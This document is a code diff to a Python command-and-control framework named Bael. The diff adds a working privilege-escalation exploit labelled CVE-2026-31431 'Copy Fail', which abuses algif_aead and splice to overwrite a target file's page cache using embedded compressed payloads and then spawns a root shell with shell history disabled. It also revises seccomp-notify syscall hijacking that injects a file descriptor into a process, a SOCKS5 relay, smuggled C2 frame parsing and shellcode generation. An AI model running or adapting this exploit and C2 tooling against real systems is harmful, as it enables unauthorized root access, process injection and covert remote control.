@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-import asyncio, ssl, argparse, random, os, logging, sys, socket, struct, threading, urllib.request, fcntl, time
-import subprocess, shutil, base64, hashlib, socket, json, ctypes, string
+import asyncio, ssl, argparse, random, os, logging, sys, socket, struct, threading, urllib.request, fcntl, time, tty
+import subprocess, shutil, base64, hashlib, socket, json, ctypes, string, signal, zlib, termios, array, platform, select
 from pathlib import Path
 from collections import deque
 from typing import Tuple, Optional, Deque, Any, Dict, List, Union
@@ -44,9 +44,11 @@ try:
     from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
     from cryptography.hazmat.primitives import hashes
     from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+    from cryptography.exceptions import InvalidTag
     CRYPTO_AVAILABLE = True
 except ImportError:
     CRYPTO_AVAILABLE = False
+    class InvalidTag(Exception): pass
 
 __version__ = "0.2.3"
 __author__ = "J4ck3LSyN"
@@ -107,8 +109,10 @@ class BaelShield:
 class SocksRelay:
     """Diagnostic-focused relay - Priority: Make C2 (whoami) work"""
 
-    def __init__(self):
+    def __init__(self, username: str = None, password: str = None):
         self.magic = SMUGGLE_MAGIC
+        self.username = username
+        self.password = password
 
     def _hexdump(self,data:bytes,length:int=16,prefix:str="") -> str:
         if not data: return "(empty)"
@@ -125,50 +129,46 @@ class SocksRelay:
         try:
             # === SOCKS5 Handshake ===
             logger.debug("[SOCKS] Reading handshake...")
-            header = await asyncio.wait_for(socks_r.read(2), timeout=5.0)
-            logger.debug(f"[SOCKS] Handshake header: {header.hex() if header else None}")
+            header = await asyncio.wait_for(socks_r.read(2), timeout=8.0)
             if len(header) < 2 or header[0] != 0x05:
                 logger.warning("[x] Bad SOCKS handshake");return
             
             nmethods = header[1]
-            methods = await socks_r.read(nmethods)
+            methods = await asyncio.wait_for(socks_r.read(nmethods), timeout=2.0)
             
-            s_user = engine.config.get("socks_user") if engine else None
-            s_pass = engine.config.get("socks_pass") if engine else None
-
-            if s_user and s_pass:
+            # Check if we should use authentication
+            if self.username and self.password:
                 if 0x02 not in methods:
-                    logger.warning("[x] Client does not support Username/Password auth")
-                    socks_w.write(b"\x05\xff")
-                    await socks_w.drain(); return
+                    logger.warning("[!] Client does not support User/Pass auth")
+                    socks_w.write(b"\x05\xFF")
+                    await socks_w.drain()
+                    return
                 
-                socks_w.write(b"\x05\x02")
+                socks_w.write(b"\x05\x02") # Select Username/Password method
                 await socks_w.drain()
                 
-                # RFC 1929 Sub-negotiation
-                sub_header = await asyncio.wait_for(socks_r.read(2), timeout=5.0)
-                if not sub_header or sub_header[0] != 0x01: return
+                # Sub-negotiation (RFC 1929)
+                auth_header = await asyncio.wait_for(socks_r.read(2), timeout=5.0) # VER, ULEN
+                if len(auth_header) < 2 or auth_header[0] != 0x01:
+                    return
                 
-                ulen = sub_header[1]
+                ulen = auth_header[1]
                 uname = (await socks_r.read(ulen)).decode()
                 plen = (await socks_r.read(1))[0]
                 passwd = (await socks_r.read(plen)).decode()
-
-                if uname == s_user and passwd == s_pass:
-                    socks_w.write(b"\x01\x00")
+                
+                if uname == self.username and passwd == self.password:
+                    socks_w.write(b"\x01\x00") # Success
                     await socks_w.drain()
-                    logger.info(f"[*] [SOCKS] Auth successful for user: {uname}")
                 else:
-                    logger.warning(f"[x] [SOCKS] Auth failed for user: {uname}")
-                    socks_w.write(b"\x01\x01")
-                    await socks_w.drain(); return
+                    socks_w.write(b"\x01\x01") # Failure
+                    await socks_w.drain()
+                    return
             else:
-                if 0x00 not in methods:
-                    socks_w.write(b"\x05\xff")
-                    await socks_w.drain(); return
-                socks_w.write(b"\x05\x00")
+                socks_w.write(b"\x05\x00") # No Auth
                 await socks_w.drain()
 
+            logger.debug("[SOCKS] Sent method selection")
             # === SOCKS Request (minimal) ===
             req = await asyncio.wait_for(socks_r.read(4), timeout=5.0)
             logger.debug(f"[SOCKS] Request: {req.hex() if req else None}")
@@ -394,6 +394,189 @@ class C2:
             self.logger.info(f"(C2.__init__) Initializing uRing Enum {json.dumps(self.ioURingEnumProc(), indent=2)}")
             sys.exit(0)
 
+    # - copy-fail
+    class copyFail:
+        def __init__(self, args):
+            self.logger = logger
+            self.args = args
+            self.payloadSh = {
+                "x86_64":  "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c00111d10d3",
+                "i686":    "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40b806c80461569098000383e101c3db1bae9e6d303c1090a1af5f9c91a19f9499d7f93820b8f361e7a10ddc4089db598c11671b0038b31858",
+                "aarch64": "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578",
+            }
+            self.payloadExec = {
+                "x86_64":  "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e02e5c1680601086578c0f0ff864c7e568fee1a1501c36f59d61133f9590dff67d944f0b3020082b00eaf",
+                "i686":    "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40381fc80461569098000383e101c3db1bae9e6de88e51e1303c99c51d31f36c83e1ed2cc688b30d001bf41180",
+                "aarch64": "789cab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd04ca5b029787e96cb8e421d47009c8bbf280dbe1272390cf04c42ba4216220f915dc103600d72b1509",
+            }
+            self.afAlg = 38
+            self.solAlg = 279
+            self.algSetKey = 1
+            self.algSetIv = 2
+            self.algSetOp = 3
+            self.algSetAeadAssoclen = 4
+            self.algSetAeadAuthsize = 5
+            self.msgMore = 0x8000
+            self.libc = ctypes.CDLL("libc.so.6", use_errno=True)
+
+        def valVuln(self):
+            try:
+                s = socket.socket(self.afAlg, socket.SOCK_SEQPACKET, 0)
+                s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+                s.close()
+                self.logger.info("[+] algif_aead available - system potentially vulnerable")
+                return True
+            except OSError as e:
+                self.logger.info(f"[-] algif_aead not available: {e}")
+                return False
+
+        def algSetAuthsize(self, sockFd, size):
+            ret = self.libc.setsockopt(sockFd, self.solAlg, self.algSetAeadAuthsize, None, size)
+            if ret < 0: raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
+
+        def algAccept(self, algFd):
+            ufd = self.libc.accept(algFd, None, None)
+            if ufd < 0: raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
+            return ufd
+
+        def doSplice(self, fdIn, offIn, fdOut, offOut, length, flags=0):
+            m = platform.machine()
+            sysSplice = 76 if m in ("i386", "i686") else (283 if m == "aarch64" else 275)
+            pIn = ctypes.byref(ctypes.c_int64(offIn)) if offIn is not None else None
+            pOut = ctypes.byref(ctypes.c_int64(offOut)) if offOut is not None else None
+            ret = self.libc.syscall(ctypes.c_long(sysSplice), ctypes.c_int(fdIn), pIn, ctypes.c_int(fdOut), pOut, ctypes.c_size_t(length), ctypes.c_uint(flags))
+            if ret < 0: raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
+            return ret
+
+        def w4Bytes(self, algFd, fileFd, offset, chunk):
+            ufd = self.algAccept(algFd)
+            try:
+                ivData = bytes([0x10]) + b"\x00" * 19
+                sockU = socket.fromfd(ufd, self.afAlg, socket.SOCK_SEQPACKET)
+                try:
+                    sockU.sendmsg([b"AAAA" + chunk], [(self.solAlg, self.algSetOp, struct.pack("<I", 0)), (self.solAlg, self.algSetIv, ivData), (self.solAlg, self.algSetAeadAssoclen, struct.pack("<I", 8))], self.msgMore)
+                finally:
+                    sockU.detach()
+                pr, pw = os.pipe()
+                spliceLen = offset + 4
+                try:
+                    self.doSplice(fileFd, 0, pw, None, spliceLen)
+                    self.doSplice(pr, None, ufd, None, spliceLen)
+                finally:
+                    os.close(pr)
+                    os.close(pw)
+                try: os.read(ufd, 8 + offset)
+                except OSError: pass
+            finally:
+                os.close(ufd)
+
+        def getWinsize(self):
+            buf = termios.array.array("H", [0, 0, 0, 0]) if hasattr(termios, 'array') else struct.pack("HHHH", 0, 0, 0, 0)
+            import array
+            buf = array.array("H", [0, 0, 0, 0])
+            try: fcntl.ioctl(sys.stdout.fileno(), termios.TIOCGWINSZ, buf)
+            except Exception: pass
+            return buf[0] or 24, buf[1] or 80
+
+        def setWinsize(self, fd, rows, cols):
+            import array
+            buf = array.array("H", [rows, cols, 0, 0])
+            try: fcntl.ioctl(fd, termios.TIOCSWINSZ, buf)
+            except Exception: pass
+
+        def writeAll(self, fd, data):
+            while data: data = data[os.write(fd, data):]
+
+        def spawnPTY(self, cmd, args, autoSetup=True):
+            rows, cols = self.getWinsize()
+            masterFd, slaveFd = os.openpty()
+            self.setWinsize(masterFd, rows, cols)
+            pid = os.fork()
+            if pid == 0:
+                os.close(masterFd)
+                os.setsid()
+                fcntl.ioctl(slaveFd, termios.TIOCSCTTY, 0)
+                for i in range(3): os.dup2(slaveFd, i)
+                if slaveFd > 2: os.close(slaveFd)
+                os.execv(cmd, args)
+                sys.exit(1)
+            os.close(slaveFd)
+            if autoSetup:
+                def injectSetup():
+                    time.sleep(0.5)
+                    try: self.writeAll(masterFd, b"bash\n")
+                    except OSError: return
+                    time.sleep(0.5)
+                    setup = f" stty rows {rows} cols {cols}\n export TERM=xterm-256color\n export SHELL=/bin/bash\n export HISTFILE=\n stty sane\n [ -f /etc/skel/.bashrc ] && source /etc/skel/.bashrc 2>/dev/null\n [ -f ~/.bashrc ] && source ~/.bashrc 2>/dev/null\n sleep 5\n reset\n"
+                    try: self.writeAll(masterFd, setup.encode())
+                    except OSError: pass
+                threading.Thread(target=injectSetup, daemon=True).start()
+            oldTty = termios.tcgetattr(sys.stdin.fileno())
+            def restore():
+                try: termios.tcsetattr(sys.stdin.fileno(), termios.TCSAFLUSH, oldTty)
+                except Exception: pass
+            tty.setraw(sys.stdin.fileno())
+            signal.signal(signal.SIGWINCH, lambda s, f: self.setWinsize(masterFd, *self.getWinsize()))
+            try:
+                while True:
+                    try: r, _, _ = select.select([sys.stdin, masterFd], [], [], 0.05)
+                    except (ValueError, OSError): break
+                    if sys.stdin in r:
+                        data = os.read(sys.stdin.fileno(), 1024)
+                        if not data: break
+                        self.writeAll(masterFd, data)
+                    if masterFd in r:
+                        try: data = os.read(masterFd, 4096)
+                        except OSError: break
+                        if not data: break
+                        self.writeAll(sys.stdout.fileno(), data)
+                    if os.waitpid(pid, os.WNOHANG)[0] != 0: break
+            finally:
+                restore()
+                os.close(masterFd)
+                try: os.waitpid(pid, 0)
+                except ChildProcessError: pass
+
+        def run(self, target, execCmd=None, noSetup=False):
+            self.logger.info("[*] CVE-2026-31431 - Copy Fail PoC (Python) [PTY]")
+            self.logger.info(f"[*] Kernel : {platform.release()}")
+            self.logger.info(f"[*] Arch   : {platform.machine()}")
+            self.logger.info(f"[*] Target : {target}")
+            if execCmd: self.logger.info(f"[*] Exec   : {execCmd}")
+            if not self.valVuln(): sys.exit(1)
+            arch = platform.machine()
+            payloadMap = self.payloadExec if execCmd else self.payloadSh
+            if arch not in payloadMap:
+                self.logger.info(f"[-] Arch '{arch}' not supported. Available: {list(payloadMap)}")
+                sys.exit(1)
+            payload = zlib.decompress(bytes.fromhex(payloadMap[arch]))
+            self.logger.info(f"[*] Payload: {len(payload)} bytes")
+            alg = socket.socket(self.afAlg, socket.SOCK_SEQPACKET, 0)
+            alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+            alg.setsockopt(self.solAlg, self.algSetKey, bytes.fromhex("0800010000000010" + "00" * 32))
+            self.algSetAuthsize(alg.fileno(), 4)
+            try: fileFd = os.open(target, os.O_RDONLY)
+            except PermissionError:
+                self.logger.info(f"[-] Cannot open {target}")
+                sys.exit(1)
+            self.logger.info(f"[*] Overwriting page cache of {target}...")
+            try:
+                total = len(payload)
+                for i in range(0, total, 4):
+                    self.w4Bytes(alg.fileno(), fileFd, i, payload[i:i+4])
+                    if i % 200 == 0:
+                        pct = i * 100 // total
+                        bar = "#" * (pct // 5) + "-" * (20 - pct // 5)
+                        print(f"  [{bar}] {i:>5}/{total} ({pct}%)", end="\r", flush=True)
+            finally:
+                os.close(fileFd)
+                alg.close()
+            print()
+            self.logger.info(f"[+] Done. {total} bytes written to page cache.")
+            self.logger.info("[+] Spawning root shell on fully interactive PTY...\n")
+            self.spawnPTY("/usr/bin/su", ["su", execCmd] if execCmd else ["su"], autoSetup=not noSetup)
+            self.logger.info("\n[*] Shell closed.")
+    
     # - seccomp
 
     class SeccompPoC:
@@ -511,9 +694,9 @@ class C2:
     def _get_hardware_info(self):
         info = []
         try:
-            info.append(f"CPU: {subprocess.getoutput('cat /proc/cpuinfo | grep "model name" | head -1 | cut -d: -f2').strip()}")
-            info.append(f"Memory: {subprocess.getoutput('free -h | grep Mem | awk \"{print $2}\"')}")
-            info.append(f"Disk: {subprocess.getoutput('df -h / | tail -1 | awk \"{print $2}\"')}")
+            # info.append(f"CPU: {subprocess.getoutput('cat /proc/cpuinfo | grep "model name" | head -1 | cut -d: -f2').strip()}")
+            # info.append(f"Memory: {subprocess.getoutput('free -h | grep Mem | awk \"{print $2}\"')}")
+            # info.append(f"Disk: {subprocess.getoutput('df -h / | tail -1 | awk \"{print $2}\"')}")
             info.append(f"Kernel: {os.uname().release}")
             info.append(f"Arch: {os.uname().machine}")
         except:
@@ -581,11 +764,10 @@ class C2:
                         "meta-line": line_text}
                     self.logger.debug(f"(_procPIDMap) Mapping: {str(m)}")
                     mappings.append(m)
-        except Exception as E:
-            pass
-        finally: 
-            self.logger.debug(f"(_procPIDMap) Final mappings: {str(mappings)}")
             return mappings
+        except Exception as E: 
+            self.logger.debug(f"(_procPIDMap) Exception caught: {str(E)}")
+            return []
 
     def verifyPostInjection(self,pid:int)->Dict:
         if not pid: return {"verified":False}
@@ -644,49 +826,62 @@ class C2:
             return is_ready
         except: return False
     
-    def supervisor0(self,notifyFD:int,loaderFD:int):
-        """Raw ctypes implementation of supervisor loop (technical)"""
-        self.logger.debug("(supervisor0) Starting...")
+    def supervisor0(self, notifyFD: int, loaderFD: int):
+        """Raw ctypes implementation of supervisor loop for seccomp notification handling"""
+        self.logger.info("(supervisor0) Seccomp notification supervisor started.")
+        self._initSeccomp()  # Ensure libc and structure definitions are initialized
+
         req = self.seccomp.SeccompNotif()
         resp = self.seccomp.SeccompNotifResp()
         addfd = self.seccomp.SeccompNotifAddfd()
-        self.logger.debug("(supervisor0) req: %s, resp: %s, addfd: %s",req,resp,addfd)
+
         alrInj = False
         while True:
-            # Poll simulation (simple select)
-            ready = self._pollFD(notifyFD,timeout=500)
-            if not ready: 
-                self.logger.debug("(supervisor0) Not ready.");break
-            # RECV
-            if libc.ioctl(notifyFD, self.seccomp.SECCOMP_IOCTL_NOTIF_RECV, ctypes.byref(req)) < 0:
-                if ctypes.get_errno() == 4: #EINTR
-                    self.logger.debug("(supervisor0) EINTR")
-                    continue
-                break
-            # ID Valid
-            if libc.ioctl(notifyFD,self.seccomp.SECCOMP_IOCTL_NOTIF_ID_VALID,ctypes.byref(ctypes.c_uint64(req.id))) < 0:
-                self.logger.debug("(supervisor0) ID Valid failed")
+            # Wait for notifications via poll helper
+            if not self._pollFD(notifyFD, timeout=1000):
                 continue
-            # HIJACK
-            hijack = (req.data.nr in (257,437)) and not alrInj # openat / openat2
-            resp.id = req.id
-            resp.flags = 0
-            resp.error = 0
-            resp.val = 0
-            if hijack and not alrInj:
+
+            # Receive the notification request
+            if libc.ioctl(notifyFD, self.seccomp.SECCOMP_IOCTL_NOTIF_RECV, ctypes.byref(req)) < 0:
+                if ctypes.get_errno() == 4:  # EINTR
+                    continue
+                self.logger.error(f"(supervisor0) RECV failed: errno {ctypes.get_errno()}")
+                break
+
+            # Verify notification ID is still valid (not timed out or canceled)
+            if libc.ioctl(notifyFD, self.seccomp.SECCOMP_IOCTL_NOTIF_ID_VALID, ctypes.byref(ctypes.c_uint64(req.id))) < 0:
+                continue
+
+            # Syscall Hijacking Logic: Intercept openat (257) or openat2 (437)
+            hijack = (req.data.nr in (257, 437)) and not alrInj
+
+            if hijack:
+                self.logger.info(f"[HIJACK] Intercepted target syscall {req.data.nr} from PID {req.pid}")
                 addfd.id = req.id
-                addfd.flags = self.seccomp.SECCOMP_ADDFD_FLAG_SEND
-                addfd.fd = loaderFD
+                addfd.flags = self.seccomp.SECCOMP_ADDFD_FLAG_SEND  # Kernel sends response automatically
+                addfd.srcfd = loaderFD
                 addfd.newfd = 0
                 addfd.newfd_flags = 0
-                ret = libc.ioctl(notifyFD,self.seccomp.SECCOMP_IOCTL_NOTIF_ADDFD,ctypes.byref(addfd))
-                if ret < 0:
-                    resp.val = ret
+
+                ret = libc.ioctl(notifyFD, self.seccomp.SECCOMP_IOCTL_NOTIF_ADDFD, ctypes.byref(addfd))
+                if ret >= 0:
+                    self.logger.info(f"[HIJACK] FD injection successful. Target FD: {ret}")
                     alrInj = True
-                    self.logger.debug("(supervisor0) Already injected...")
-            else: resp.flags = 0x00000001  # CONTINUE flag
-            self.logger.debug("(supervisor0) Sending response: %s",resp)
-            libc.ioctl(notifyFD,self.seccomp.SECCOMP_IOCTL_NOTIF_SEND,ctypes.byref(resp))
+                    continue  # Response already handled by ADDFD_FLAG_SEND
+                else:
+                    self.logger.error(f"[HIJACK] ADDFD failed: errno {ctypes.get_errno()}")
+
+            # Default response: Continue the syscall normally (SECCOMP_USER_NOTIF_FLAG_CONTINUE)
+            resp.id = req.id
+            resp.flags = 0x00000001
+            resp.error = 0
+            resp.val = 0
+
+            # Send response to resume the target process. This may fail gracefully if ID was already resolved.
+            try:
+                libc.ioctl(notifyFD, self.seccomp.SECCOMP_IOCTL_NOTIF_SEND, ctypes.byref(resp))
+            except Exception:
+                pass
 
     def _setupShellcode(self):
         self.shellcode = {
@@ -753,7 +948,11 @@ class Crypto:
             return bytes(a ^ b for a, b in zip(data, k))
         nonce = data[:12]
         chacha = ChaCha20Poly1305(self.key)
-        return chacha.decrypt(nonce, data[12:], None)
+        try:
+            return chacha.decrypt(nonce, data[12:], None)
+        except InvalidTag:
+            self.logger.error("C2 Decryption failed: Invalid Tag. Possible key mismatch, version incompatibility, or corrupted packet.")
+            return b""
 
 # =========================== Core ===========================
 
@@ -804,11 +1003,11 @@ class Bael:
         ctx = ssl.create_default_context(purpose)
         ctx.minimum_version = ssl.TLSVersion.TLSv1_3
         ctx.check_hostname = False
-        
+        logger.debug("(_setupPKI) Context setup complete...")
         ca = BaelShield.get_asset("ca.crt", self.shieldKey)
         cert = BaelShield.get_asset("srv.crt" if self.server else "rmt.crt", self.shieldKey)
         key = BaelShield.get_asset("srv.key" if self.server else "rmt.key", self.shieldKey)
-        
+        logger.debug("(_setupPKI) Certificates loaded...")
         # Filesystem fallback
         if not ca and hasattr(self.args, 'ca_crt') and os.path.exists(self.args.ca_crt): ca = Path(self.args.ca_crt).read_bytes()
         if self.server:
@@ -817,21 +1016,20 @@ class Bael:
         else:
             if not cert and hasattr(self.args, 'rm_crt') and os.path.exists(self.args.rm_crt):cert = Path(self.args.rm_crt).read_bytes()
             if not key and hasattr(self.args, 'rm_key') and os.path.exists(self.args.rm_key):key = Path(self.args.rm_key).read_bytes()
-
-        if not all([ca, cert, key]):
-            logger.critical("mTLS assets (CA, Cert, or Key) are missing. Secure connection is mandatory.")
+        if all([ca, cert, key]):
+            logger.info("[*] Full mTLS enabled with embedded certificates")
+            base = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
+            self.tmpDir = base / f".bael_{os.getpid()}_{random.randint(10000, 99999)}"
+            self.tmpDir.mkdir(parents=True, exist_ok=True)
+            (self.tmpDir / "ca.crt").write_bytes(ca)
+            (self.tmpDir / "cert.pem").write_bytes(cert)
+            (self.tmpDir / "key.pem").write_bytes(key)
+            ctx.load_verify_locations(str(self.tmpDir / "ca.crt"))
+            ctx.load_cert_chain(str(self.tmpDir / "cert.pem"), str(self.tmpDir / "key.pem"))
+            ctx.verify_mode = ssl.CERT_REQUIRED
+        else:
+            logger.critical("Required mTLS certificates (CA, Cert, Key) are missing. mTLS is mandatory for Bael.")
             sys.exit(1)
-
-        logger.info("[*] Full mTLS enabled with certificates")
-        base = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
-        self.tmpDir = base / f".bael_{os.getpid()}_{random.randint(10000, 99999)}"
-        self.tmpDir.mkdir(parents=True, exist_ok=True)
-        (self.tmpDir / "ca.crt").write_bytes(ca)
-        (self.tmpDir / "cert.pem").write_bytes(cert)
-        (self.tmpDir / "key.pem").write_bytes(key)
-        ctx.load_verify_locations(str(self.tmpDir / "ca.crt"))
-        ctx.load_cert_chain(str(self.tmpDir / "cert.pem"), str(self.tmpDir / "key.pem"))
-        ctx.verify_mode = ssl.CERT_REQUIRED
         return ctx
 
     def cleanup(self):
@@ -905,24 +1103,27 @@ class Bael:
             
             buffer.extend(data)
             
-            while True:
+            # Process buffered data for smuggled frames
+            while SMUGGLE_MAGIC in buffer:
                 magic_idx = buffer.find(SMUGGLE_MAGIC)
-                if magic_idx == -1:
-                    if len(buffer) >= len(SMUGGLE_MAGIC):
-                        del buffer[:len(buffer) - (len(SMUGGLE_MAGIC) - 1)]
+                
+                # If there is data before the magic, it's regular relay traffic (ignored in server mode here)
+                if magic_idx > 0:
+                    buffer = buffer[magic_idx:]
+                
+                # Check if we have enough for the length header
+                if len(buffer) < len(SMUGGLE_MAGIC) + 2:
                     break
                 
-                if magic_idx > 0:
-                    del buffer[:magic_idx]
+                payload_len = int.from_bytes(buffer[len(SMUGGLE_MAGIC):len(SMUGGLE_MAGIC)+2], "big")
+                frame_end = len(SMUGGLE_MAGIC) + 2 + payload_len
                 
-                if len(buffer) < len(SMUGGLE_MAGIC) + 2: break
-                p_len = int.from_bytes(buffer[len(SMUGGLE_MAGIC):len(SMUGGLE_MAGIC)+2], "big")
-                frame_end = len(SMUGGLE_MAGIC) + 2 + p_len
-                if len(buffer) < frame_end: break
+                if len(buffer) < frame_end:
+                    break # Wait for more data
                 
                 frame = bytes(buffer[:frame_end])
                 await self.c2.pCommand(frame)
-                del buffer[:frame_end]
+                buffer = buffer[frame_end:]
             
             # Clean up buffer if it grows too large with non-C2 data
             if len(buffer) > 65536 and SMUGGLE_MAGIC not in buffer:
@@ -965,7 +1166,10 @@ class Bael:
             logger.info(f"(CLIENT) Connected to C2: {rhost}:{rport} | mTLS: {ssl_ctx.verify_mode != ssl.CERT_NONE}")
             
             if self.config.get("socks") or socks:
-                relay = SocksRelay()
+                relay = SocksRelay(
+                    username=self.config.get("socks_user"),
+                    password=self.config.get("socks_pass")
+                )
                 srv = await asyncio.start_server(
                     lambda sr, sw: relay.handle(sr, sw, r, w, self), 
                     '127.0.0.1', 1080
@@ -1017,14 +1221,17 @@ def genkeys(args):
         run(f'openssl req -x509 -newkey rsa:4096 -keyout {keysRoot}/ca.key -out {keysRoot}/ca.crt -days 365 -nodes -subj "/CN=BaelCA" -addext "basicConstraints=critical,CA:TRUE" -addext "keyUsage=critical,keyCertSign,cRLSign"')
         for r in ["srv", "rmt"]:
             run(f'openssl req -newkey rsa:4096 -keyout {keysRoot}/{r}.key -out {keysRoot}/{r}.csr -nodes -subj "/CN=Bael-{r}" -addext "basicConstraints=CA:FALSE" -addext "keyUsage=critical,digitalSignature,keyEncipherment"')
-            # Use -copy_extensions copy to ensure CSR extensions are transferred to the signed certificate
             run(f'openssl x509 -req -in {keysRoot}/{r}.csr -CA {keysRoot}/ca.crt -CAkey {keysRoot}/ca.key -CAcreateserial -out {keysRoot}/{r}.crt -days 365 -copy_extensions copy')
         logger.info(f"Keys generated in {keysRoot}")
     except Exception as e: logger.error(f"Keygen failed: {e}")
 
-def privkey(args):
-    charset = string.ascii_letters + string.digits + string.punctuation
-    return ''.join(random.choice(charset) for _ in range(args.kg_priv))
+def genpriv(args):
+    if not args.kg_priv: return
+    logger.info("(genpriv) Generating random key: len(%s)",args.kg_priv)
+    charset = string.ascii_letters + string.digits + string.punctuation.replace('"', '').replace("'", "").replace("\\", "").replace("`", "").replace("$", "")
+    key = ''.join(random.choice(charset) for _ in range(args.kg_priv))
+    logger.info("(genpriv) [DO NOT SHARE]\n\t<?======== `%s` ========>?",key)
+    return key
 
 def main():
     p = argparse.ArgumentParser(description=f"Bael v{__version__} — Encrypted mTLS C2")
@@ -1034,11 +1241,11 @@ def main():
     p.add_argument("--bl-name", default="bMTLSTUN0")
     # Keygen
     p.add_argument("--kg-out", default=".baelKeys")
-    p.add_argument("--kg-priv",type=int,default=32,help="(Overides --key) Generates and uses a private key by desired length.")
+    p.add_argument("--kg-priv", type=int,help="(NOTE:Overrides --key) Generates a functional key based off length (default:32).")
     # Connections
     p.add_argument("--lhost", default="0.0.0.0:443")
     p.add_argument("--remote", type=str, help="C2 host:port")
-    p.add_argument("--rconnex", action="store_true")
+    p.add_argument("--rconnex", action="store_true",help="(Depricated) Legacy connection check (only checks raw socket).")
     # Tunnels
     p.add_argument("--socks", action="store_true")
     p.add_argument("--socks-user", help="SOCKS5 username")
@@ -1053,15 +1260,60 @@ def main():
     # Logging
     p.add_argument("--log-lvl", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"])
     # C2 CLI
+    # Generate shellcode
     p.add_argument("--c2-gsc",type=str,help="Generates Shellcode based off command.")
+    # Process, Memory & Seccomp
     p.add_argument("--c2-uringenum",action="store_true",help="Demonstrates concept of io_uring-based stealth enumeration.")
+    # copyFail
+    p.add_argument("--c2-cfchecks",action="store_true",help="Runs check for copy-fail vuln (CVE-2026-31431)")
+    p.add_argument("--c2-cftarget", type=str, help="Target file for copy-fail exploit (e.g. /etc/passwd)")
+    p.add_argument("--c2-cfexec", type=str, help="Command to execute with root privileges after successful exploit")
+    p.add_argument("--c2-cfrun",action="store_true",help="Runs full copy-fail exploit [PTY].")
     
     args = p.parse_args()
     logger.setLevel(args.log_lvl.upper())
-    if args.kg_priv:
-        key = privkey(args)
-        logger.info("[DO NOT SHARE] <======== `%s` ========>", key)
-        args.key = key
+
+    # Handle C2 CLI specific functionalities that should exit
+    if args.c2_gsc:
+        # Create a dummy Crypto instance for shellcode generation
+        dummy_crypt = Crypto(args.key)
+        # Create a dummy C2 instance to access shellcode generation logic
+        dummy_c2 = C2(dummy_crypt, None, args)
+        dummy_c2._setupShellcode() # Ensure shellcode is loaded
+        cmd = args.c2_gsc
+        if cmd in dummy_c2.shellcode:
+            sc = dummy_c2.shellcode[cmd]
+            logger.info(f"\n[+] Generated Shellcode for: {sc['name']}")
+            logger.info(f"Hex: {sc['bytes'].hex()}")
+            logger.info(f"C-style: " + "".join([f"\\x{b:02x}" for b in sc['bytes']]))
+            if 'asm' in sc: logger.info(f"[*] ASM:\n{sc['asm']}")
+        else: logger.info(f"Shellcode for '{cmd}' not found. Available: {', '.join(dummy_c2.shellcode.keys())}")
+        sys.exit(0)
+
+    if args.c2_uringenum:
+        # Create a dummy C2 instance to access io_uring enumeration logic
+        dummy_c2 = C2(None, None, args) # crypt=None, engine=None as they are not used for uringenum
+        logger.info(f"Initializing uRing Enum {json.dumps(dummy_c2.ioURingEnumProc(), indent=2)}")
+        sys.exit(0)
+
+    if args.c2_cfchecks:
+        # Create a dummy C2 instance to access copyFail class
+        dummy_c2 = C2(None, None, args)
+        cf = dummy_c2.copyFail(args)
+        cf.valVuln()
+        sys.exit(0)
+
+    if args.c2_cfrun:
+        if not args.c2_cftarget:
+            logger.error("Error: --c2-cftarget is required to execute the copy-fail exploit.")
+            sys.exit(1)
+        dummy_c2 = C2(None, None, args)
+        cf = dummy_c2.copyFail(args)
+        cf.run(args.c2_cftarget, execCmd=args.c2_cfexec)
+        sys.exit(0)
+
+    if args.kg_priv: args.key = genpriv(args)
+
     if args.mode == "keygen":
         genkeys(args);return
     # Embed assets before build or runtime
